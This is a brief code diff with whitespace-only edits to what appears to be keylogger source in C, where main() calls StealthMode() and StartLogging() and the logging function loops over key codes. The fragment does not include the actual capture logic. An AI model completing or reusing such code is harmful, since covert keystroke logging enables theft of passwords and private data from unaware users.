@@ -12,14 +12,12 @@ int main()
 {
     StealthMode();
     StartLogging();
-
     return 0;
 }
 
 void StartLogging()
 {
-        char c;
-
+    char c;
     for(;;)
     {
         for(c=8;c<=222;c++);
